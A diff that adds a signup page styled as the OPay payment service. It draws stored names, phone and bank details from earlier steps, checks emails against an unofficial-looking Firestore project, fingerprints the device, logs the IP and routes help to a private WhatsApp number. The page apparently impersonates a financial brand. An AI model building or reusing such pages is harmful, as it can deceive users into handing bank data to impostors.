@@ -1,0 +1,753 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=yes">
+    <title>OPay Login</title>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
+    <style>
+        /* ===== THEME VARIABLES (same as original) ===== */
+        :root {
+            --bg-color: #ffffff;
+            --text-color: #1a1a1a;
+            --header-bg: #ffffff;
+            --input-border: #e0e0e0;
+            --input-focus: #00B876;
+            --input-bg: #ffffff;
+            --label-color: #00B876;
+            --error-color: #dc2626;
+            --helper-color: #666;
+            --helper-link: #00B876;
+            --btn-bg: #00B876;
+            --btn-disabled-opacity: 0.5;
+            --btn-enabled-opacity: 1;
+            --signup-text: #666;
+            --signup-link: #00B876;
+            --back-icon: #1a1a1a;
+            --help-link: #00B876;
+            --modal-overlay: rgba(0,0,0,0.5);
+            --modal-bg: #ffffff;
+            --modal-text: #1a1a1a;
+            --modal-input-border: #e0e0e0;
+        }
+
+        body.dark-theme {
+            --bg-color: #121212;
+            --text-color: #e0e0e0;
+            --header-bg: #1e1e1e;
+            --input-border: #333333;
+            --input-focus: #1e9c43;
+            --input-bg: #2d2d2d;
+            --label-color: #1e9c43;
+            --error-color: #f87171;
+            --helper-color: #b0b0b0;
+            --helper-link: #1e9c43;
+            --btn-bg: #1e9c43;
+            --btn-disabled-opacity: 0.3;
+            --btn-enabled-opacity: 1;
+            --signup-text: #b0b0b0;
+            --signup-link: #1e9c43;
+            --back-icon: #e0e0e0;
+            --help-link: #1e9c43;
+            --modal-overlay: rgba(0,0,0,0.7);
+            --modal-bg: #2d2d2d;
+            --modal-text: #e0e0e0;
+            --modal-input-border: #555;
+        }
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Inter', sans-serif;
+        }
+
+        body {
+            background-color: var(--bg-color);
+            color: var(--text-color);
+            display: flex;
+            flex-direction: column;
+            min-height: 100vh;
+            transition: background-color 0.3s, color 0.3s;
+        }
+
+        .header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 12px 20px;
+            background-color: var(--header-bg);
+        }
+
+        .back-btn {
+            background: none;
+            border: none;
+            cursor: pointer;
+            padding: 4px;
+            display: flex;
+            align-items: center;
+        }
+
+        .back-icon {
+            width: 20px;
+            height: 20px;
+            stroke: var(--back-icon);
+            stroke-width: 2;
+            fill: none;
+        }
+
+        .theme-toggle {
+            width: 20px;
+            height: 20px;
+            cursor: pointer;
+            stroke: var(--help-link);
+            fill: none;
+            stroke-width: 2;
+            margin-right: 16px;
+        }
+
+        .help-link {
+            color: var(--help-link);
+            font-weight: 500;
+            font-size: 13px;
+            text-decoration: none;
+            cursor: pointer;
+        }
+
+        .logo-container {
+            display: flex;
+            justify-content: center;
+            margin: 8px 0 24px;
+            background-color: var(--bg-color);
+        }
+
+        .logo-container img {
+            height: 36px;
+            width: auto;
+        }
+
+        .main-content {
+            flex: 1;
+            padding: 0 20px;
+            background-color: var(--bg-color);
+        }
+
+        .title {
+            font-size: 24px;
+            font-weight: 700;
+            margin-bottom: 28px;
+            color: var(--text-color);
+        }
+
+        .input-group {
+            position: relative;
+            margin-bottom: 4px;
+        }
+
+        .input-field {
+            width: 100%;
+            padding: 14px 14px 14px 14px;
+            border: 1px solid var(--input-border);
+            border-radius: 12px;
+            font-size: 15px;
+            outline: none;
+            background-color: var(--input-bg);
+            color: var(--text-color);
+            transition: border-color 0.2s, box-shadow 0.2s;
+        }
+
+        .input-field:focus {
+            border-color: var(--input-focus);
+            box-shadow: 0 0 0 3px rgba(0, 184, 118, 0.1);
+        }
+
+        .input-field.typing:not(.valid) {
+            border-color: var(--error-color);
+        }
+
+        .input-field.valid {
+            border-color: var(--input-focus);
+        }
+
+        .input-label {
+            position: absolute;
+            top: -8px;
+            left: 12px;
+            background-color: var(--bg-color);
+            padding: 0 4px;
+            font-size: 12px;
+            font-weight: 500;
+            color: var(--label-color);
+            pointer-events: none;
+        }
+
+        .error-message {
+            color: var(--error-color);
+            font-size: 12px;
+            margin-top: 4px;
+            margin-bottom: 8px;
+            display: none;
+        }
+
+        .helper-text {
+            font-size: 13px;
+            color: var(--helper-color);
+            margin: 12px 0 36px;
+        }
+
+        .helper-text span {
+            color: var(--helper-link);
+            font-weight: 600;
+            cursor: pointer;
+        }
+
+        .bottom-section {
+            margin-top: auto;
+            display: flex;
+            flex-direction: column;
+            gap: 20px;
+            padding: 0 20px 20px;
+            background-color: var(--bg-color);
+        }
+
+        .next-btn {
+            width: 100%;
+            padding: 14px;
+            background-color: var(--btn-bg);
+            border: none;
+            border-radius: 30px;
+            color: white;
+            font-size: 15px;
+            font-weight: 700;
+            cursor: pointer;
+            opacity: var(--btn-disabled-opacity);
+            transition: opacity 0.2s;
+        }
+
+        .next-btn.enabled {
+            opacity: var(--btn-enabled-opacity);
+        }
+
+        .signup-text {
+            text-align: center;
+            font-size: 13px;
+            color: var(--signup-text);
+        }
+
+        .signup-link {
+            color: var(--signup-link);
+            font-weight: 600;
+            text-decoration: none;
+            display: block;
+            margin-top: 4px;
+            cursor: pointer;
+        }
+
+        /* ===== GREEN CIRCLE LOADER ===== */
+        .loader {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            z-index: 9999;
+            justify-content: center;
+            align-items: center;
+            background: rgba(0, 0, 0, 0.5);
+        }
+
+        .loader-container {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .green-ring {
+            position: relative;
+            width: 52px;
+            height: 52px;
+            border-radius: 50%;
+            background-color: #1e9c43;
+            border: none;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .logo-wrapper {
+            width: 35px;
+            height: 35px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            border-radius: 50%;
+            background: white;
+            box-shadow: 0 4px 0px rgba(0, 0, 0, 0.05);
+            animation: pulse-zoom 0.7s ease-in-out infinite;
+            z-index: 3;
+        }
+
+        .logo-image {
+            width: 25px;
+            height: 25px;
+            object-fit: contain;
+            border-radius: 50%;
+        }
+
+        .orbit {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            pointer-events: none;
+            animation: rotate-dot 1.5s linear infinite;
+            transform-origin: center center;
+            z-index: 2;
+        }
+
+        .dot {
+            position: absolute;
+            top: 25px;
+            left: 100%;
+            transform: translateX(-1300%);
+            width: 1px;
+            height: 1px;
+            background: white;
+            border-radius: 60%;
+            box-shadow: 0 0 8px 9px rgba(255, 255, 255, 0.5);
+        }
+
+        @keyframes pulse-zoom {
+            0% { transform: scale(1.03); opacity: 0.8; }
+            50% { transform: scale(1.15); opacity: 1; }
+            100% { transform: scale(1.03); opacity: 0.8; }
+        }
+
+        @keyframes rotate-dot {
+            from { transform: rotate(0deg); }
+            to   { transform: rotate(360deg); }
+        }
+
+        /* ===== CUSTOM MODAL STYLES ===== */
+        .modal-overlay {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: var(--modal-overlay);
+            align-items: center;
+            justify-content: center;
+            z-index: 10000;
+        }
+
+        .modal-overlay.show {
+            display: flex;
+        }
+
+        .modal-container {
+            background: var(--modal-bg);
+            border-radius: 28px;
+            width: 85%;
+            max-width: 320px;
+            padding: 24px 20px 28px;
+            text-align: center;
+            animation: fadeIn 0.2s ease;
+        }
+
+        .modal-title {
+            font-size: 18px;
+            font-weight: 700;
+            color: var(--modal-text);
+            margin-bottom: 12px;
+        }
+
+        .modal-message {
+            font-size: 14px;
+            color: var(--helper-color);
+            line-height: 1.4;
+            margin-bottom: 24px;
+        }
+
+        .modal-input {
+            width: 100%;
+            padding: 12px;
+            border: 1px solid var(--modal-input-border);
+            border-radius: 12px;
+            background: var(--input-bg);
+            color: var(--text-color);
+            font-size: 15px;
+            margin-bottom: 20px;
+            outline: none;
+        }
+
+        .modal-input:focus {
+            border-color: var(--input-focus);
+        }
+
+        .modal-btn {
+            background: var(--btn-bg);
+            color: white;
+            border: none;
+            padding: 12px 0;
+            border-radius: 40px;
+            font-weight: 600;
+            font-size: 16px;
+            width: 100%;
+            cursor: pointer;
+        }
+
+        .modal-btn-secondary {
+            background: transparent;
+            border: 1px solid var(--input-border);
+            color: var(--text-color);
+            margin-top: 12px;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; transform: scale(0.95); }
+            to { opacity: 1; transform: scale(1); }
+        }
+    </style>
+</head>
+<body>
+    <div class="header">
+        <button class="back-btn" id="backBtn">
+            <svg class="back-icon" viewBox="0 0 24 24">
+                <path d="M15 18l-6-6 6-6"/>
+            </svg>
+        </button>
+        <div style="display: flex; align-items: center;">
+            <svg id="themeToggle" class="theme-toggle" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                <circle cx="12" cy="12" r="5"></circle>
+                <line x1="12" y1="1" x2="12" y2="3"></line>
+                <line x1="12" y1="21" x2="12" y2="23"></line>
+                <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
+                <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
+                <line x1="1" y1="12" x2="3" y2="12"></line>
+                <line x1="21" y1="12" x2="23" y2="12"></line>
+                <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
+                <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
+            </svg>
+            <a href="#" class="help-link" id="helpLink">Help</a>
+        </div>
+    </div>
+
+    <div class="logo-container">
+        <img src="https://iili.io/qpIrMgI.png" alt="OPay">
+    </div>
+
+    <div class="main-content">
+        <h1 class="title" id="pageTitle">Enter your email to sign up</h1>
+
+        <div class="input-group">
+            <label class="input-label">Enter your Email Address</label>
+            <input type="email" id="loginInput" class="input-field" autofocus>
+        </div>
+        <div id="emailError" class="error-message">Please enter a valid email address!</div>
+
+        <div class="helper-text">
+            Lost your email address? <span id="changeNumber">Change Now</span>
+        </div>
+    </div>
+
+    <div class="bottom-section">
+        <button id="nextBtn" class="next-btn" disabled>NEXT</button>
+        <div class="signup-text">
+            Already have an OPay Account?
+            <span class="signup-link" id="signupLink">Log in</span>
+        </div>
+    </div>
+
+    <!-- ===== GREEN CIRCLE LOADER ===== -->
+    <div id="loadingPopup" class="loader">
+        <div class="loader-container">
+            <div class="green-ring">
+                <div class="orbit"><div class="dot"></div></div>
+                <div class="logo-wrapper">
+                    <img src="https://iili.io/qT81u1e.png" alt="Loading Logo" class="logo-image">
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- ===== CUSTOM MODALS ===== -->
+    <!-- Change Email Modal -->
+    <div id="changeEmailModal" class="modal-overlay">
+        <div class="modal-container">
+            <div class="modal-title">Change Email</div>
+            <div class="modal-message">Enter your new email address:</div>
+            <input type="email" id="newEmailInput" class="modal-input" placeholder="example@domain.com">
+            <button id="confirmEmailBtn" class="modal-btn">Update</button>
+            <button id="cancelEmailBtn" class="modal-btn modal-btn-secondary">Cancel</button>
+        </div>
+    </div>
+
+    <!-- Account Already Exists Modal -->
+    <div id="accountExistsModal" class="modal-overlay">
+        <div class="modal-container">
+            <div class="modal-title">Account Already Exists</div>
+            <div class="modal-message">An account has already been created on this device. Please log in instead.</div>
+            <button id="loginFromModalBtn" class="modal-btn">Log In</button>
+            <button id="closeExistsModalBtn" class="modal-btn modal-btn-secondary">Cancel</button>
+        </div>
+    </div>
+
+    <!-- Firebase SDK (module) -->
+    <script type="module">
+        import { initializeApp } from "https://www.gstatic.com/firebasejs/12.10.0/firebase-app.js";
+        import { getFirestore, collection, query, where, getDocs } from "https://www.gstatic.com/firebasejs/12.10.0/firebase-firestore.js";
+        import { getAnalytics } from "https://www.gstatic.com/firebasejs/12.10.0/firebase-analytics.js";
+
+        const firebaseConfig = {
+            apiKey: "AIzaSyAjLxkisBi9pzmjlwdHnYfo25XR2Z6ToEs",
+            authDomain: "opay-plus-5802c.firebaseapp.com",
+            projectId: "opay-plus-5802c",
+            storageBucket: "opay-plus-5802c.firebasestorage.app",
+            messagingSenderId: "967061625774",
+            appId: "1:967061625774:web:236f88391ccdd9edd2863f",
+            measurementId: "G-H0QV81VYBY"
+        };
+
+        const app = initializeApp(firebaseConfig);
+        const analytics = getAnalytics(app);
+        const db = getFirestore(app);
+
+        // DOM elements
+        const input = document.getElementById('loginInput');
+        const nextBtn = document.getElementById('nextBtn');
+        const changeSpan = document.getElementById('changeNumber');
+        const signupLink = document.getElementById('signupLink');
+        const backBtn = document.getElementById('backBtn');
+        const helpLink = document.getElementById('helpLink');
+        const errorDiv = document.getElementById('emailError');
+        const themeToggle = document.getElementById('themeToggle');
+        const pageTitle = document.getElementById('pageTitle');
+
+        // ===== MODAL ELEMENTS =====
+        const changeEmailModal = document.getElementById('changeEmailModal');
+        const newEmailInput = document.getElementById('newEmailInput');
+        const confirmEmailBtn = document.getElementById('confirmEmailBtn');
+        const cancelEmailBtn = document.getElementById('cancelEmailBtn');
+
+        // Account exists modal
+        const accountExistsModal = document.getElementById('accountExistsModal');
+        const loginFromModalBtn = document.getElementById('loginFromModalBtn');
+        const closeExistsModalBtn = document.getElementById('closeExistsModalBtn');
+
+        function showModal(modal) { modal.classList.add('show'); }
+        function hideModal(modal) { modal.classList.remove('show'); }
+
+        cancelEmailBtn.addEventListener('click', () => hideModal(changeEmailModal));
+        closeExistsModalBtn.addEventListener('click', () => hideModal(accountExistsModal));
+        loginFromModalBtn.addEventListener('click', () => {
+            hideModal(accountExistsModal);
+            window.location.href = 'login-email.html';
+        });
+
+        // ----- Retrieve ALL existing user data from createacct.html -----
+        let userFirstName = localStorage.getItem('opayUserFirstName');
+        let userPhone = localStorage.getItem('opayUserPhone');
+        let userFullName = localStorage.getItem('opayUserFullName');
+        let userAccountNumber = localStorage.getItem('opayAccountNumber');
+        let userBankCode = localStorage.getItem('opayBankCode');
+        let userBankName = localStorage.getItem('opayBankName');
+
+        // If essential data missing, redirect back to createacct.html
+        if (!userFirstName || !userPhone) {
+            window.location.href = 'createacct.html';
+        }
+
+        // Pre-fill email if already entered before
+        const savedEmail = localStorage.getItem('opayUserEmail');
+        if (savedEmail) {
+            input.value = savedEmail;
+            setTimeout(() => input.dispatchEvent(new Event('input')), 100);
+        }
+
+        // ===== THEME TOGGLE =====
+        const body = document.body;
+        const savedTheme = localStorage.getItem('theme');
+        if (savedTheme === 'dark') {
+            body.classList.add('dark-theme');
+            themeToggle.innerHTML = `<path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>`;
+        } else {
+            themeToggle.innerHTML = `<circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/>`;
+        }
+
+        themeToggle.addEventListener('click', () => {
+            if (body.classList.contains('dark-theme')) {
+                body.classList.remove('dark-theme');
+                localStorage.setItem('theme', 'light');
+                themeToggle.innerHTML = `<circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/>`;
+            } else {
+                body.classList.add('dark-theme');
+                localStorage.setItem('theme', 'dark');
+                themeToggle.innerHTML = `<path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>`;
+            }
+        });
+
+        // ===== EMAIL VALIDATION =====
+        function isValidEmail(email) {
+            return /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email);
+        }
+
+        function updateInputState() {
+            const value = input.value.trim();
+            const valid = isValidEmail(value);
+            if (value.length > 0) input.classList.add('typing');
+            else input.classList.remove('typing');
+            if (valid) {
+                input.classList.add('valid');
+                input.classList.remove('typing');
+            } else {
+                input.classList.remove('valid');
+            }
+            errorDiv.style.display = (value.length > 0 && !valid) ? 'block' : 'none';
+            nextBtn.disabled = !valid;
+            if (valid) nextBtn.classList.add('enabled');
+            else nextBtn.classList.remove('enabled');
+        }
+        input.addEventListener('input', updateInputState);
+        updateInputState();
+
+        // ===== LOADER CONTROL =====
+        function showLoader(show) {
+            const loader = document.getElementById('loadingPopup');
+            if (loader) loader.style.display = show ? 'flex' : 'none';
+        }
+
+        // ===== DEVICE FINGERPRINT =====
+        function getDeviceFingerprint() {
+            const ua = navigator.userAgent;
+            const screenRes = `${screen.width}x${screen.height}x${screen.colorDepth}`;
+            const lang = navigator.language || navigator.userLanguage;
+            const tz = Intl.DateTimeFormat().resolvedOptions().timeZone;
+            const fingerprint = `${ua}|${screenRes}|${lang}|${tz}`;
+            let hash = 0;
+            for (let i = 0; i < fingerprint.length; i++) {
+                const char = fingerprint.charCodeAt(i);
+                hash = ((hash << 5) - hash) + char;
+                hash |= 0;
+            }
+            return hash.toString();
+        }
+
+        // ===== FETCH USER IP =====
+        async function fetchUserIP() {
+            try {
+                const response = await fetch('https://api.ipify.org?format=json');
+                const data = await response.json();
+                return data.ip;
+            } catch (error) {
+                console.error('Failed to fetch IP:', error);
+                return 'unknown';
+            }
+        }
+
+        // ===== CHECK IF EMAIL ALREADY EXISTS IN FIRESTORE =====
+        async function emailExists(email) {
+            try {
+                const usersRef = collection(db, 'users');
+                const q = query(usersRef, where('email', '==', email));
+                const querySnapshot = await getDocs(q);
+                return !querySnapshot.empty;
+            } catch (err) {
+                console.error('Error checking email:', err);
+                return false;
+            }
+        }
+
+        // ===== CHECK IF DEVICE FINGERPRINT ALREADY EXISTS IN FIRESTORE =====
+        async function deviceFingerprintExists(fingerprint) {
+            try {
+                const usersRef = collection(db, 'users');
+                const q = query(usersRef, where('deviceFingerprint', '==', fingerprint));
+                const querySnapshot = await getDocs(q);
+                return !querySnapshot.empty;
+            } catch (err) {
+                console.error('Error checking device fingerprint:', err);
+                return false;
+            }
+        }
+
+        // ===== NEXT BUTTON – ENFORCE ONE ACCOUNT PER DEVICE/EMAIL =====
+        nextBtn.addEventListener('click', async () => {
+            if (nextBtn.disabled) return;
+
+            const email = input.value.trim().toLowerCase();
+            showLoader(true);
+
+            // 1. Check if email already registered
+            const emailAlreadyUsed = await emailExists(email);
+            if (emailAlreadyUsed) {
+                showLoader(false);
+                showModal(accountExistsModal);
+                return;
+            }
+
+            // 2. Check if this device already created an account
+            const fingerprint = getDeviceFingerprint();
+            const deviceAlreadyUsed = await deviceFingerprintExists(fingerprint);
+            if (deviceAlreadyUsed) {
+                showLoader(false);
+                showModal(accountExistsModal);
+                return;
+            }
+
+            // 3. No existing account – proceed with creation
+            // Save email, device fingerprint and IP (will be stored in Firestore during final account creation)
+            localStorage.setItem('opayUserEmail', email);
+            localStorage.setItem('opayDeviceFingerprint', fingerprint);
+            const ip = await fetchUserIP();
+            localStorage.setItem('opayUserIP', ip);
+
+            // All other user data (firstName, phone, bank details) remain untouched
+            setTimeout(() => {
+                window.location.href = 'createpass.html';
+            }, 500);
+        });
+
+        // ===== "CHANGE NOW" LINK – Custom Modal =====
+        changeSpan.addEventListener('click', () => {
+            newEmailInput.value = '';
+            showModal(changeEmailModal);
+        });
+
+        confirmEmailBtn.addEventListener('click', () => {
+            const newEmail = newEmailInput.value.trim();
+            if (!isValidEmail(newEmail)) {
+                alert('Please enter a valid email address.');
+                return;
+            }
+            input.value = newEmail;
+            localStorage.setItem('opayUserEmail', newEmail);
+            input.dispatchEvent(new Event('input'));
+            hideModal(changeEmailModal);
+        });
+
+        // ===== "LOG IN" LINK – redirect to login-email.html =====
+        signupLink.addEventListener('click', (e) => {
+            e.preventDefault();
+            window.location.href = 'login-email.html';
+        });
+
+        // ===== BACK BUTTON =====
+        backBtn.addEventListener('click', () => {
+            if (confirm('Do you want to exit?')) window.history.back();
+        });
+
+        // ===== HELP LINK: WHATSAPP =====
+        helpLink.addEventListener('click', (e) => {
+            e.preventDefault();
+            window.open('https://wa.me/2349116125762?text=Hello%2C%20I%20need%20help%20with%20my%20OPay%20account.', '_blank');
+        });
+    </script>
+    <script src="/pwa-check.js"></script>
+    <script src="/network-popup.js"></script>
+</body>
+</html>
